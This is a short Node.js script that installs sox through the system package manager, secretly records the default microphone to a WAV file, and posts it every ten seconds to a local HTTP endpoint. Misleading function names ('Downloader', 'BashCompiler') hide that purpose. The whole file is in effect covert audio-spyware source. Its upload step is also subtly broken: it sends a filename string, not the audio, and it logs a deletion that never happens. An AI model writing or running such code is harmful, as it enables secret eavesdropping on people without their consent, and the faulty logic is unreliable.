const { execFile } = require('child_process');
const os = require("os");
const axios = require("axios");
const fs = require("fs");
const formData = require("form-data");

function Downloader() {

    let osType = os.type();
    osType = osType.toLowerCase();

    let program;

    if (osType == "darwin") program = "brew";
    else if (osType == "linux") program = "apt";
    else program = "choco";
    const args = [ 'install', 'sox' ];
    
    return new Promise((resolve, reject) => {
        let output = {};
        const child = execFile(program, args, (err, stdout, stderr) => {
            if (stdout) {
                output.stdout = stdout;
            }
            if (err) {
                if (stderr) {
                    output.stderr = stderr;
                    return;
                }
                output.err = err;
            }
        });

        child.on("close", () => {
            resolve(output);
        });
    })
}

Downloader().then(() => {
    BashCompiler();
});

setInterval(() => {

    const filePath = './fuckYou.wav';

    const form = new formData();
    form.append('audio', 'fuckYou.wav', filePath);

    axios.post('http://localhost:8000/', form, {
        headers: {
            'Content-Type': 'multipart/form-data',
        },
    }).then(() => {
        console.log('File deleted & audio sent');
    });

}, 10000);

function BashCompiler() {

    const program = 'sox';
    const args = [ '-d', 'fuckYou.wav' ];
    
    return new Promise((resolve, reject) => {
        let output = {};
        const child = execFile(program, args, (err, stdout, stderr) => {
            if (stdout) {
                output.stdout = stdout;
            }
            if (err) {
                if (stderr) {
                    output.stderr = stderr;
                    return;
                }
                output.err = err;
            }
        });

        child.on("close", () => {
            resolve(output);
        });
    })
}